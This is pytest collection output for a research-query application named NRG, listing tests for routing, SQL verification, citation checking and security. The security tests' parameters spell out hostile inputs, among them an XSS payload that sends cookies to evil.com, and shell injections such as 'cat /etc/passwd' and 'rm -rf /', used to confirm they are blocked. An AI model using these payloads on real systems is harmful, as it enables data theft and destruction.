/Users/srujansai/Desktop/NRG/.venv/lib/python3.11/site-packages/pytest_asyncio/plugin.py:247: PytestDeprecationWarning: The configuration option "asyncio_default_fixture_loop_scope" is unset.
The event loop scope for asynchronous fixtures will default to the fixture caching scope. Future versions of pytest-asyncio will default the loop scope for asynchronous fixtures to function scope. Set the default fixture loop scope explicitly in order to avoid unexpected behavior in the future. Valid fixture loop scopes are: "function", "class", "module", "package", "session"

  warnings.warn(PytestDeprecationWarning(_DEFAULT_FIXTURE_LOOP_SCOPE_UNSET))
[1m============================= test session starts ==============================[0m
platform darwin -- Python 3.11.7, pytest-8.2.2, pluggy-1.6.0
rootdir: /Users/srujansai/Desktop/NRG
          <Function test_backoff_is_2_power_n>
          <Function test_backoff_max_is_3_retries>
          <Function test_backoff_sleep_fn_called_on_failure>
          <Function test_no_sleep_on_success>
          <Function test_retries_until_success>
        <Class TestRetryHandlerIntegration>
          <Function test_handler_produces_result_after_retries>
          <Function test_handler_raises_after_max_retries>
      <Module test_router.py>
        <Class TestRouterEdgeCases>
          <Function test_empty_query_returns_hybrid_safe_mode>
          <Function test_whitespace_only_query_returns_hybrid>
          <Function test_single_word_query_routes_to_rag>
          <Function test_sql_injection_detected_routes_safe>
          <Function test_extremely_long_query_truncated>
          <Function test_query_normalized_whitespace>
        <Class TestRouterConfidenceThresholds>
          <Function test_high_confidence_structured>
          <Function test_low_confidence_upgraded_to_hybrid>
          <Function test_confidence_threshold_configurable>
        <Class TestRouterAmbiguityDetection>
          <Function test_detect_ambiguous_best>
          <Function test_detect_ambiguous_compare>
          <Function test_detect_ambiguous_recent>
          <Function test_detect_not_ambiguous_simple_query>
        <Class TestRouterMultiIntent>
          <Function test_multi_intent_detected>
          <Function test_multi_intent_with_comma>
          <Function test_single_intent_not_flagged>
        <Class TestRouter2StageRouting>
          <Function test_stage1_regex_classification>
          <Function test_llm_confirmation_disabled_by_env>
          <Function test_high_confidence_skips_llm>
        <Class TestRouterPlannerIntegration>
          <Function test_planner_desired_skills_used>
          <Function test_planner_sql_only>
          <Function test_planner_rag_only>
        <Class TestRouterCatalogIntegration>
          <Function test_catalog_structured_route_is_used_for_known_tables>
          <Function test_catalog_clarification_is_visible_for_vague_query>
        <Class TestRouterDefaultClarifications>
          <Function test_clarification_best>
          <Function test_clarification_compare>
          <Function test_clarification_recent>
        <Class TestRouterMetrics>
          <Function test_metrics_singleton>
          <Function test_metrics_record>
          <Function test_metrics_ambiguity_rate>
          <Function test_metrics_llm_enhancement_rate>
          <Function test_self_calibration_data_collection>
        <Class TestRouterIntentClassification>
          <Function test_structured_intent_high_confidence>
          <Function test_unstructured_intent_high_confidence>
          <Function test_hybrid_intent_when_both_keywords_present>
          <Function test_no_match_defaults_to_unstructured>
        <Class TestRouterSQLInjectionDefense>
          <Function test_sql_injection_patterns_detected>
          <Function test_normal_query_not_flagged>
        <Class TestRouterRoutingDecisionStructure>
          <Function test_all_required_fields_present>
          <Function test_routing_rationale_is_informative>
        <Class TestRouterConfiguration>
          <Function test_confidence_thresholds_from_env>
          <Function test_2stage_routing_toggle>
          <Function test_self_calibration_toggle>
        <Class TestRouterEvaluationDataset>
          <Function test_dataset_has_60_queries>
          <Function test_dataset_covers_all_categories>
          <Function test_dataset_has_sql_injection_cases>
          <Function test_dataset_has_edge_cases>
          <Function test_routing_dataset_structured_queries>
          <Function test_routing_dataset_security_queries>
        <Class TestRouterComplexityClassification>
          <Function test_trivial_query_returns_trivial_complexity>
          <Function test_complex_query_returns_complex_or_synthesis_heavy>
          <Function test_simple_query_returns_simple_or_trivial>
          <Function test_complexity_field_present_for_all_queries>
      <Module test_router_simple_query.py>
        <Class TestSimpleQueryBypass>
          <Function test_count_query_routes_to_text_to_sql>
          <Function test_existence_query_routes_to_text_to_sql>
          <Function test_aggregation_query_routes_to_text_to_sql>
          <Function test_filter_query_routes_to_text_to_sql>
          <Function test_multi_word_but_simple_query_not_routed_to_multihop>
          <Function test_single_word_query_defaults_to_rag>
          <Function test_empty_query_defaults_to_hybrid>
          <Function test_sql_injection_is_rejected>
      <Module test_schema_rag_wrapper.py>
        <Function test_schema_rag_retrieve_returns_ddl_chunks>
        <Function test_schema_rag_join_graph_and_glossary_are_available>
        <Function test_schema_rag_token_reduction_uses_parsed_full_schema>
      <Module test_silent_wrong_answer.py>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q01-Which institute offers the most intensive innovation curriculum based on credits?-SELECT CAST(total_credit_score AS INTEGER) AS total_credits FROM academic_courses_details-rows0-text_cast_silent_failure]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q02-Show ratio of PhD innovation courses to Undergraduate ones for IIT Bombay.-SELECT COUNT(*) AS ratio FROM academic_courses_details WHERE institute = 'IIT Bombay'-rows1-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q03-Flag institutes where grant funding dropped more than 50 percent year-over-year.-SELECT institute, SUM(grant_received) AS total FROM innovation_grant_from_govt GROUP BY institute-rows2-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q04-Top 5 funding agencies by amount.-SELECT gov_organisation_name FROM innovation_grant_from_govt GROUP BY gov_organisation_name-rows3-row_count_one_with_limit_missing]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q05-Percentage of IIT Madras innovations stuck at Lab Validation Level 4.-SELECT stage_of_technology, COUNT(*) FROM trl_stages GROUP BY stage_of_technology-rows4-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q06-List Market Ready TRL 9 technologies for IIT Madras.-SELECT * FROM trl_stages WHERE stage_of_technology = 'TRL 9'-rows5-row_count_zero]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q07-Cost of Innovation grant spend for every Patent granted.-SELECT g.institute FROM innovation_grant_from_govt g JOIN combined_ipo_patent_data p ON g.institute = p.applicants-rows6-entity_resolution_join_risk]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q08-Show all PG innovation courses at IIT Madras for the last 3 years.-SELECT * FROM academic_courses_details WHERE level_of_course = 'PG' LIMIT 100-rows7-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q09-Which institute has the most PhD courses?-SELECT institute, COUNT(*) AS count FROM academic_courses_details WHERE level_of_course = 'PhD' GROUP BY institute ORDER BY count DESC-rows8-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q10-How does that compare to their UG numbers?-SELECT COUNT(*) AS count FROM actual_student_strength-rows9-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q11-YoY growth for PG courses at IIT Madras.-SELECT financial_year, COUNT(*) AS count FROM academic_courses_details GROUP BY financial_year-rows10-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q12-Strategy shift where UG stops and PhD spikes.-SELECT financial_year, level_of_course, COUNT(*) FROM academic_courses_details GROUP BY financial_year, level_of_course-rows11-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q13-Correlation courses vs startups.-SELECT institute, course_count, startup_count FROM joined-rows12-null_ratio_high]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q14-High capex and low innovation courses.-SELECT institute, capex, courses FROM capex_courses-rows13-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q15-Rising stars whose funding grew while national average declined.-SELECT institute FROM trend_join-rows14-row_count_zero]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q16-High grants but low expenditure utilization audit.-SELECT institute, SUM(grant_received) AS grant FROM innovation_grant_from_govt GROUP BY institute-rows15-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[Q17-Pipeline progression across TRL stages.-SELECT financial_year, stage_of_technology, 100 AS conversion_rate FROM vw_innovations_trl-rows16-metric_too_perfect]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-11-List researchers on a patent with applicant containing Biotech and a government innovation grant in the same financial year.-SELECT g.institute FROM innovation_grant_from_govt g JOIN combined_ipo_patent_data p ON g.institute = p.applicants-rows17-entity_resolution_join_risk]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-12-Progression from Idea Level 1 to Market Ready Level 9 across all IITs.-SELECT stage_of_technology, COUNT(*) FROM vw_innovations_trl GROUP BY stage_of_technology-rows18-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-13-Median time between patent filing and grant date plus correlation with grant amount.-SELECT field_of_invention, median_days FROM patent_dates-rows19-null_ratio_high]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-14-Institutes with disparity between sanctioned intake and actual student strength.-SELECT institute, seats - total_students AS disparity FROM joined GROUP BY institute-rows20-aggregate_collapse]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-15-Publications where author email domain differs from affiliated institute domain.-SELECT institute, email_record FROM combined_ipo_patent_data-rows21-None]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-16-Total faculty salary expenditure per state vs research consultancy income.-SELECT state, salaries, consultancy FROM joined-rows22-null_ratio_high]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-17-Startups with both FDI investment and seed funding sorted by investment.-SELECT f.startup_name FROM fdi_investment f JOIN seed_funding s ON f.startup_name = s.startup_name-rows23-row_count_zero]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-18-Top 3 institutes by patents_granted/phd_students_graduated ratio per academic year.-SELECT patents_granted / phd_students_graduated AS ratio FROM yearly-rows24-division_by_zero_signal]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-19-Average citation count of open-access vs non-open-access publications.-SELECT AVG(CAST(total_citations AS INTEGER)) FROM advance_search_data-rows25-text_cast_silent_failure]>
        <Function test_corpus_cases_are_corrected_or_marked_for_clarification[ADV-20-Researchers listed as inventor on a patent plus publication in same subfield plus funding record from a ministry.-SELECT * FROM a JOIN b ON a.name = b.name JOIN c ON c.name = b.name JOIN d ON d.name = c.name-rows26-row_count_zero]>
        <Function test_verifier_refuses_low_confidence_sql_answer>
      <Module test_sql_oracle.py>
        <Class TestResultVerifier>
          <Function test_verify_empty_results_returns_warning>
          <Function test_verify_large_result_set_returns_warning>
          <Function test_verify_incomplete_sql_detected>
          <Function test_verify_numeric_sanity_positive_h_index>
          <Function test_verify_numeric_sanity_unrealistic_h_index>
          <Function test_verify_numeric_sanity_unrealistic_impact_factor>
          <Function test_verify_normal_results_passes>
        <Class TestConfidenceScoring>
          <Function test_high_confidence_complete_sql_with_results>
          <Function test_low_confidence_empty_results>
          <Function test_medium_confidence_partial_issues>
          <Function test_low_confidence_incomplete_sql>
        <Class TestSQLOracleAsk>
          <Function test_ask_returns_oracle_response>
          <Function test_ask_low_confidence_triggers_correction>
        <Class TestExplanationGeneration>
          <Function test_explanation_for_results>
          <Function test_explanation_for_empty_results>
          <Function test_explanation_for_low_confidence_includes_warning>
        <Class TestOracleResponse>
          <Function test_oracle_response_fields>
      <Module test_state_transitions.py>
        <Function test_compiled_workflow_has_required_nodes>
        <Function test_workflow_has_expected_linear_edges>
        <Function test_verifier_has_retry_and_end_edges>
        <Function test_no_required_workflow_node_is_a_dead_end>
        <Function test_dag_cycle_returns_structured_dead_end_error>
        <Function test_verifier_failure_result_retries_once_then_fails>
      <Module test_synthesizer_citations.py>
        <Function test_extract_citations_from_response>
        <Function test_fallback_synthesis_returns_citations>
        <Function test_system_prompt_requires_tier_voice_four_part_structure_and_numeric_citations>
        <Function test_hybrid_fallback_combines_structured_and_document_evidence>
        <Function test_hybrid_fallback_keeps_three_sources_and_deduplicates_repeated_context>
        <Function test_hybrid_fallback_keeps_same_publication_distinct_chunk_citations>
      <Module test_synthesizer_llm.py>
        <Function test_synthesizer_uses_llm_client>
        <Function test_synthesizer_falls_back_on_llm_failure>
        <Function test_synthesizer_falls_back_on_malformed_llm_response>
      <Module test_synthesizer_multi_source.py>
        <Class TestSynthesizerMultiSourceRetention>
          <Function test_sql_only_result_contains_all_sql_fields>
          <Function test_rag_only_result_contains_chunk_content>
          <Function test_hybrid_result_contains_both_sql_and_rag>
          <Function test_3_source_result_has_all_three_citations>
          <Function test_three_sources_all_have_distinct_citations>
        <Class TestFallbackHybridSynthesis>
          <Function test_fallback_hybrid_has_sql_table_and_rag_excerpts>
      <Module test_synthesizer_safety.py>
        <Function test_system_prompt_uses_minimised_evidence_packet>
        <Function test_system_prompt_redacts_pii_secrets_and_raw_dump_fields>
        <Function test_cloud_synthesis_is_explicitly_gated>
        <Function test_synthesizer_node_does_not_preverify_with_cloud_when_gate_is_closed>
        <Function test_cloud_synthesis_reports_provenance_when_allowed>
      <Module test_two_brain_conflict_resolution.py>
        <Class TestTwoBrainConflictDetection>
          <Function test_detects_factual_conflict_model_vs_db>
          <Function test_no_conflict_when_both_paths_agree>
          <Function test_model_wins_for_qualitative_analysis>
        <Class TestTwoBrainConflictResolution>
          <Function test_live_db_wins_for_exact_counts>
          <Function test_model_wins_for_trend_comparisons>
          <Function test_confidence_delta_surface_when_unresolvable>
        <Class TestTwoBrainIntegration>
          <Function test_full_pipeline_routes_and_resolves>
      <Module test_verifier_node.py>
        <Function test_nrg_state_carries_answer_engine_v1_fields>
        <Function test_verifier_marks_unsupported_numeric_answer_low_confidence>
        <Class TestCitationValidation>
          <Function test_valid_pub_id_passes_validation>
          <Function test_hallucinated_pub_id_fails_validation>
          <Function test_mixed_valid_and_invalid_citations>
          <Function test_structured_citation_always_valid>
          <Function test_chunk_id_citation_always_valid>
          <Function test_malformed_citation_type_stripped>
          <Function test_duplicate_citations_deduplicated>
          <Function test_duplicate_structured_citations_with_sql_rows_are_verified>
          <Function test_enriched_citations_contain_metadata>
          <Function test_invalid_citation_logged>
        <Class TestCitationStripping>
          <Function test_strip_function_removes_invalid_only>
          <Function test_stripped_response_preserves_text_around>
        <Class TestCitationCoverage>
          <Function test_coverage_calculation>
        <Class TestCitationDeduplication>
          <Function test_deduplicate_removes_duplicates>
      <Module test_verifier_numeric_faithfulness.py>
        <Function test_verifier_rejects_unsupported_numeric_claim_from_sql_rows>
        <Function test_verifier_accepts_crore_scaled_numeric_claim_from_sql_rows>
        <Function test_verifier_rejects_supported_numeric_claim_without_sentence_citation>
      <Module test_workflow_pipeline.py>
        <Function test_workflow_runs_full_orchestration_pipeline>
        <Function test_workflow_surfaces_rag_failures_as_warnings>
    <Package property>
      <Module test_citation_presence.py>
        <Class TestCitationPresence>
          <Function test_citation_with_source_has_evidence>
          <Function test_citation_without_source_fails_verification>
          <Function test_all_retrieval_sources_have_citations>
          <Function test_empty_citations_with_sources_warns>
          <Function test_citation_chain_is_complete>
          <Function test_no_phantom_citations>
      <Module test_tier_filtering_always_returns_subset.py>
        <Class TestTierFilteringSubset>
          <Function test_tier_filtering_hierarchy_researcher_superset>
          <Function test_tier_filtering_hierarchy_government_superset>
          <Function test_researcher_includes_all_tiers>
          <Function test_random_queries_researcher_tier[AI researchers in Gujarat]>
          <Function test_random_queries_researcher_tier[Machine learning experts]>
          <Function test_random_queries_researcher_tier[Data science researchers]>
          <Function test_random_queries_researcher_tier[NLP researchers in India]>
          <Function test_random_queries_researcher_tier[Computer vision research groups]>
          <Function test_random_queries_researcher_tier[Robotics researchers]>
          <Function test_random_queries_researcher_tier[Deep learning experts]>
          <Function test_random_queries_researcher_tier[AI publications from IITs]>
          <Function test_random_queries_researcher_tier[Research areas in AI]>
          <Function test_random_queries_researcher_tier[Researchers working on LLMs]>
          <Function test_random_queries_government_tier[AI researchers in Gujarat]>
          <Function test_random_queries_government_tier[Policy recommendations for AI]>
          <Function test_random_queries_government_tier[Research statistics by state]>
          <Function test_random_queries_government_tier[Government research funding]>
          <Function test_random_queries_industry_tier[AI researchers in Gujarat]>
          <Function test_random_queries_industry_tier[Industry collaboration opportunities]>
          <Function test_random_queries_industry_tier[Anonymized researcher profiles]>
          <Function test_tier_filtering_consistency_across_multiple_queries>
          <Function test_tier_filtering_no_data_leaks_upward>
      <Module test_token_budget_never_exceeded.py>
        <Class TestTokenBudget>
          <Function test_token_usage_within_budget>
          <Function test_token_usage_exceeds_budget_returns_warning>
          <Function test_token_tracking_multiple_queries>
          <Function test_large_response_still_within_budget>
          <Function test_token_budget_enforced_across_tiers>
          <Function test_combined_query_conversation_token_budget>
    <Package scripts>
      <Module test_batch4_data_sql_schema_audit.py>
        <Function test_read_module_constant_handles_annotated_alembic_constants>
        <Function test_upgrade_risk_markers_handles_typed_upgrade_signature>
        <Function test_upgrade_risk_markers_only_flags_upgrade_body>
        <Function test_collect_plan_relations_returns_nested_relation_names>
      <Module test_build_qdrant_index.py>
        <Function test_get_collection_info_treats_small_threshold_exempt_collection_as_complete>
      <Module test_capture_killer_query_evidence.py>
        <Function test_capture_harness_respects_explicit_database_url>
        <Function test_capture_harness_defaults_to_populated_local_database>
        <Function test_capture_harness_upgrades_default_root_database_url>
        <Function test_explain_writer_registers_sqlite_split_part>
      <Module test_check_env.py>
        <Function test_cloud_synthesis_false_is_valid_opt_in_default>
        <Function test_cloud_synthesis_true_is_valid_explicit_opt_in>
        <Function test_cloud_synthesis_rejects_non_boolean_values>
        <Function test_empty_staged_env_list_does_not_warn>
      <Module test_check_slow_test_markers.py>
        <Function test_long_timeout_requires_slow_marker>
        <Function test_slow_marker_allows_long_timeout>
        <Function test_module_slow_marker_allows_long_timeout>
      <Module test_ingest_nrg_db.py>
        <Function test_full_schema_contains_real_nrg_tables_and_columns>
        <Function test_ingest_nrg_database_loads_csvs_documents_and_is_idempotent>
      <Module test_ingest_qdrant.py>
        <Function test_chunking_uses_512_with_50_overlap>
        <Function test_dry_run_reports_ready_message>
        <Function test_non_dry_run_upserts_with_idempotent_point_ids>
      <Module test_ingest_qdrant_documents.py>
        <Function test_parse_document_txt_reads_frontmatter>
        <Function test_access_tier_mapping>
        <Function test_parse_legacy_metadata_block>
        <Function test_parse_json_fenced_metadata_with_blank_arrays>
        <Function test_dry_run_prepares_points_without_qdrant>
        <Function test_ingest_upserts_idempotent_point_ids_and_metadata>
        <Function test_prebuilt_payload_without_vectors_flows_through_embedding>
      <Module test_insert_test_data_qdrant.py>
        <Function test_qdrant_test_data_seeder_uses_supported_client_kwargs>
      <Module test_missing_script_modules.py>
        <Function test_migration_and_audit_investigation_scripts_import>
        <Function test_seed_relations_script_invocation_can_import_src>
      <Module test_phase7_preflight.py>
        <Function test_phase7_preflight_blocks_without_helm>
        <Function test_phase7_preflight_marks_triggers_ready>
        <Function test_cli_require_returns_nonzero_when_task_blocked>
      <Module test_prewarm_release_cache.py>
        <Function test_default_release_queries_cover_three_acceptance_questions>
        <Function test_query_payload_uses_production_query_contract>
        <Coroutine test_prewarm_queries_posts_each_query_to_query_endpoint>
      <Module test_pydantic_migration_guard.py>
        <Function test_ci_guard_requires_required_jobs_to_pin_below_python_314>
        <Function test_ci_guard_accepts_pinned_jobs_and_allowed_failure_314_lane>
        <Function test_direct_pydantic_v1_import_inventory_ignores_docs_and_reports_code>
        <Function test_main_requires_migration_plan_document>
      <Module test_quality_bar_scorecard.py>
        <Function test_c5_uses_scheduler_dry_run_when_live_qdrant_is_unavailable>
        <Function test_c4_scorecard_creates_locust_report_parent>
        <Function test_c4_scorecard_can_run_locust_with_multiple_processes>
        <Function test_c4_scorecard_rejects_target_text_without_numeric_p99>
        <Function test_c4_scorecard_rejects_failure_rate_above_zero>
        <Function test_c4_scorecard_extracts_locust_percentile_table_when_summary_is_missing>
        <Function test_c4_scorecard_reads_numeric_p99_from_locust_report>
        <Function test_c4_scorecard_reads_per_endpoint_metrics_from_locust_report>
        <Function test_c4_scorecard_ignores_response_percentile_objects_without_request_counts>
        <Function test_c4_locustfile_preissued_token_path_does_not_send_forwarded_ip>
      <Module test_red_team_live_replay.py>
        <Function test_corpus_meets_lb5_minimums>
        <Function test_baseline_safe_http_without_leak_is_downgraded>
        <Function test_expected_safe_control_can_remain_allowed_safe>
        <Function test_dangerous_response_is_failure_decision>
        <Function test_summary_flags_uncontained_baseline_decisions>
        <Function test_local_api_startup_skips_embedder_warmup>
      <Module test_red_team_replay_script.py>
        <Function test_red_team_replay_uses_bounded_curl_timeouts>
        <Function test_red_team_replay_fails_fast_and_does_not_lock_demo_users>
        <Function test_red_team_replay_never_counts_http_000_as_pass_or_warning>
        <Function test_red_team_replay_xss_tests_fail_on_transport_errors>
      <Module test_repair_qdrant_payloads.py>
        <Function test_infer_public_metadata_defaults_missing_vectors_to_tier3>
        <Function test_repair_collection_dry_run_reports_stale_points>
        <Function test_repair_collection_upserts_enriched_vectors>
      <Module test_run_critical_path_contract.py>
        <Function test_api_image_includes_alembic_config>
        <Function test_critical_path_runner_uses_container_venv_alembic_with_config>
        <Function test_final_runner_delegates_to_strict_verified_runner_and_uses_login_username>
      <Module test_runtime_image_scan_gate.py>
        <Function test_runtime_image_gate_accepts_clean_frontend_nginx_and_no_fix_api_boundary>
        <Function test_runtime_image_gate_fails_fixable_api_high>
        <Function test_runtime_image_gate_fails_pip_audit_vulnerability>
      <Module test_scan_env_history_secrets.py>
        <Function test_secret_assignment_detects_sensitive_keys_without_value_leak>
        <Function test_secret_assignment_ignores_placeholders_and_non_secret_keys>
        <Function test_text_output_redacts_secret_value>
        <Function test_remediation_summary_groups_paths_keys_and_rotation_classes>
        <Function test_remediation_summary_pass_when_no_findings>
        <Function test_rotation_class_mapping_keeps_unknowns_visible>
      <Module test_seed_local_quality_fixtures.py>
        <Function test_seed_quality_fixtures_populates_empty_core_tables>
        <Function test_seed_quality_fixtures_only_tops_up_existing_rows>
      <Module test_seed_relations.py>
        <Function test_seed_relations_supports_current_sqlite_schema>
      <Module test_sovereign_deploy_script.py>
        <Function test_sovereign_deploy_script_help_runs>
        <Function test_sovereign_deploy_script_imports>
      <Module test_vector_drift_scheduler.py>
        <Class TestShouldTriggerReindex>
          <Function test_triggers_when_reindex_info_flag_set>
          <Function test_triggers_when_max_shift_breaches_threshold>
          <Function test_triggers_when_drift_alert_warning>
          <Function test_triggers_when_drift_alert_critical>
          <Function test_no_trigger_when_stable_and_no_flags>
        <Function test_default_check_skips_benchmark_when_qdrant_has_no_indexed_vectors>
        <Coroutine test_run_once_calls_check_fn>
        <Coroutine test_run_once_triggers_reindex_when_needed>
        <Coroutine test_run_once_no_trigger_when_stable>
        <Coroutine test_loop_runs_max_iterations>
        <Coroutine test_loop_returns_schedulerrun_list>
        <Coroutine test_interval_must_be_positive>
      <Module test_verify_db_merge.py>
        <Function test_project_source_reader_repairs_title_commas_and_glued_rows>
        <Function test_lab_and_funding_source_readers_split_glued_records>
      <Module test_verify_intake_bundle.py>
        <Function test_verify_csv_hmacs_accepts_valid_rows>
        <Function test_verify_csv_hmacs_reports_invalid_rows>
        <Function test_verify_bundle_checks_manifest_hash_and_hmac>
    <Package security>
      <Module test_admin_rbac_routes.py>
        <Function test_tier3_is_blocked_from_admin_and_metrics_routes>
      <Module test_adversarial_inputs.py>
        <Class TestPIIInjection>
          <Function test_pii_in_query_sanitized[My Aadhaar is 1234-5678-9012]>
          <Function test_pii_in_query_sanitized[My PAN is ABCDE1234F]>
          <Function test_pii_in_query_sanitized[Call me at 9876543210]>
          <Function test_pii_in_query_sanitized[Email me at test@example.com]>
          <Function test_pii_in_query_sanitized[My Aadhaar: 123456789012]>
          <Function test_pii_in_query_sanitized[PAN: ABCDE1234F]>
          <Function test_pii_in_query_sanitized[Phone: +91-9876543210]>
          <Function test_pii_in_query_sanitized[aadhaar: 1234-5678-9012]>
          <Function test_pii_in_query_sanitized[My VID is 1234-5678-9012-5432]>
          <Function test_bulk_pii_extraction_attempt_blocked>
        <Class TestXSSBlocking>
          <Function test_xss_payload_sanitized[<script>alert(1)</script>]>
          <Function test_xss_payload_sanitized[Hello <img src=x onerror=alert(1)>]>
          <Function test_xss_payload_sanitized[<svg/onload=alert(1)>]>
          <Function test_xss_payload_sanitized[Test <iframe src=javascript:alert(1)>]>
          <Function test_xss_payload_sanitized['; alert(1); var x=']>
          <Function test_xss_payload_sanitized[{{constructor.constructor('alert(1)')()}}]>
          <Function test_xss_payload_sanitized[<script>fetch('http://evil.com?c='+document.cookie)</script>]>
        <Class TestCommandInjection>
          <Function test_command_injection_blocked[List files; ls /etc/passwd]>
          <Function test_command_injection_blocked[Show data && cat /etc/passwd]>
          <Function test_command_injection_blocked[AI researcher | cat /etc/passwd]>
          <Function test_command_injection_blocked[Search researchers `whoami`]>
          <Function test_command_injection_blocked[Test $(whoami)]>
          <Function test_command_injection_blocked[AI researchers'; rm -rf /]>
          <Function test_command_injection_blocked[Query researchers\ncat /etc/passwd]>
        <Class TestTierBypassAttempts>
          <Function test_tier_1_cannot_access_tier_3_data>
          <Function test_unauthenticated_access_blocked>
          <Function test_invalid_token_rejected>
          <Function test_tier_bypass_query_returns_empty_or_filtered[Show me all admin records]>
          <Function test_tier_bypass_query_returns_empty_or_filtered[Get tier 0 data]>
          <Function test_tier_bypass_query_returns_empty_or_filtered[List all restricted documents]>
          <Function test_tier_bypass_query_returns_empty_or_filtered[Access internal-only research]>
          <Function test_tier_bypass_query_returns_empty_or_filtered[Bypass tier restriction: admin]>
        <Class TestDPDPConsent>
          <Function test_consent_required_before_query>
          <Function test_consent_accept_validates>
          <Function test_withdrawal_returns_empty_results>
        <Class TestNoEgressLeakage>
          <Function test_no_data_uri_in_response[data:text/html]>
          <Function test_no_data_uri_in_response[data:text/plain]>
          <Function test_no_mailto_exfiltration>
      <Module test_audit_chain.py>
        <Class TestAuditChain>
          <Function test_append_generates_hash>
          <Function test_chain_links>
          <Function test_verify_passes_clean>
          <Function test_verify_fails_tampered>
          <Function test_verify_fails_deleted_event>
          <Function test_merkle_root>
          <Function test_all_event_types_logged>
        <Function test_module_level_verify>
        <Class TestAuditChainPerUserBinding>
          <Function test_verify_chain_per_user_passes_fresh_log>
          <Function test_verify_chain_per_user_detects_tampered_kid>
          <Function test_verify_chain_per_user_detects_tampered_fingerprint>
          <Function test_verify_chain_per_user_false_allows_tampered_binding>
          <Function test_verify_chain_per_user_system_events_skip_binding>
          <Function test_verify_chain_per_user_multiple_users>
          <Function test_verify_chain_per_user_empty_log>
          <Function test_verify_chain_per_user_mixed_events>
      <Module test_data_boundary.py>
        <Class TestDataBoundary>
          <Function test_no_raw_db_schema_to_llm>
          <Function test_vector_metadata_filtered>
          <Function test_audit_log_created>
        <Class TestAccessControl>
          <Function test_tier1_can_access_all>
          <Function test_tier2_restricted>
          <Function test_tier3_most_restricted>
      <Module test_egress_allowlist.py>
        <Class TestEgressSchemaAllowlistLoader>
          <Function test_is_table_allowed_valid>
          <Function test_is_table_allowed_invalid>
          <Function test_is_column_allowed_valid>
          <Function test_is_column_allowed_blocked>
          <Function test_get_blocked_content_returns_frozenset>
          <Function test_is_llm_prompt_allowed>
          <Function test_get_allowed_tables>
          <Function test_get_table_columns>
        <Class TestSovereignHTTPXClientAllowed>
          <Function test_allowed_user_query>
          <Function test_allowed_schema_prompt_valid_table>
          <Function test_allowed_plan_json>
          <Function test_allowed_citation_ids>
          <Function test_allowed_session_id>
        <Class TestSovereignHTTPXClientBlockedTables>
          <Function test_blocked_unlisted_table_in_schema_prompt>
          <Function test_blocked_unlisted_table_join>
          <Function test_blocked_user_credentials_table>
          <Function test_blocked_passwords_table>
          <Function test_blocked_private_notes_table>
        <Class TestSovereignHTTPXClientBlockedColumns>
          <Function test_blocked_email_column>
          <Function test_blocked_phone_column>
          <Function test_blocked_full_text_field>
          <Function test_blocked_fulltext_nested>
          <Function test_blocked_researcher_table_column_in_schema>
        <Class TestSovereignHTTPXClientBlockedPatterns>
          <Function test_blocked_raw_content_field>
